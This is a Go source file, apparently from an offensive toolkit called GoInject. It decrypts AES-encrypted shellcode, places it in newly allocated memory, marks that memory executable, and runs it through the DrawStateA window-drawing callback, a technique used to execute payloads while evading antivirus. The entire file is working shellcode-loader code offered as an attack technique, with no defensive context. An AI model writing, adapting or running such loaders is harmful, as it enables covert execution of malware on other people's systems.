package techniques 

import (
	"encoding/hex"
	"unsafe"
	"GoInject/crypto"
	"syscall"
)

var (
		user32 = syscall.MustLoadDLL("user32.dll")
		RtlMoveMemory = kernel32.MustFindProc("RtlMoveMemory")
		VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
		VirtualProtect = kernel32.MustFindProc("VirtualProtect")
		//enumDisplayMonitors = user32.MustFindProc("EnumDisplayMonitors")
		drawState = user32.MustFindProc("DrawStateA")
)

func Callback (shellcodeEncrypted string, key string){
	//Read shellcode
	// shellcodeEncrypted, err := ioutil.ReadFile(shellcodeFile)
	// if err != nil {
 //          log.Fatal(err)
 //     }
    plaintext := crypto.DecryptAES(shellcodeEncrypted, key)
	shellcode, _ := hex.DecodeString(string(plaintext))

	//Allocate memory
	size := len(shellcode)
	address, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(size), 0x3000, 0x04)

	//Copy the shellcode into the newly allocated memory
	RtlMoveMemory.Call(address, uintptr((unsafe.Pointer(&shellcode[0]))), uintptr(size))

	//Change the memory protection to PAGE_EXECUTE_READ
	oldProtect := 0x04
	VirtualProtect.Call(address, uintptr(size), 0x20, uintptr(unsafe.Pointer(&oldProtect)))

	//enumDisplayMonitors.Call(uintptr(0), uintptr(0), address, uintptr(0))
	drawState.Call(uintptr(0), uintptr(0), address, uintptr(0), uintptr(0), 123, 123, 123, 123, uintptr(0))
}